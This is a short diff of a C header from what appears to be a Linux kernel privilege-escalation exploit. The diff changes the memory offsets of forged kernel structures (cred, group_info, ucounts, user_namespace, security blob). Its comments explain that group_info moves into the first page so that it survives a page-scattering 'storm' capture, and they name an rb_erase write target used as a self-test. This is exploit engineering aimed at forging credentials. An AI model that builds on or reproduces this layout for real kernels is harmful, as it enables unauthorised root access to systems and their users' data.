@@ -248,8 +248,16 @@
 #define FAKE_SEC_BLOB_OFF    0x0EC0  /* task_security_struct {osid,sid,...} */
 #define FAKE_USER_STRUCT_OFF 0x0F00  /* struct user_struct */
 #define FAKE_UCOUNTS_OFF     0x0F80  /* struct ucounts */
-#define FAKE_GROUP_INFO_OFF  0x1100  /* struct group_info {usage,ngroups=0} */
-#define FAKE_USER_NS_OFF     0x1200  /* fake user_namespace (self-contained, no real kernel ptr) */
+/* group_info moved to page 0 (was 0x1100): under the MOVABLE-storm
+ * capture the mm page's four base pages scatter into different user
+ * pages, so only the first 4KB of the layout is reliably present - and
+ * exec's prepare_creds() reads group_info. 0xDB0 sits in the free gap
+ * between fake_task->pi_blocked_on (ends 0xD98) and FAKE_CRED (0xE00). */
+#define FAKE_GROUP_INFO_OFF  0x0DB0
+#define FAKE_USER_NS_OFF     0x1200  /* fake user_namespace (exec path only: 
+                                  * fake ucounts->ns terminator + ucount_max;
+                                  * NOT present under storm capture - storm
+                                  * runs are no-exec) */
 #define SELFTEST_OFF         0x1F00  /* rb_erase write target for self-test */
 #define SELFTEST_VALUE       0x1F10  /* marker written into SELFTEST_OFF */
 
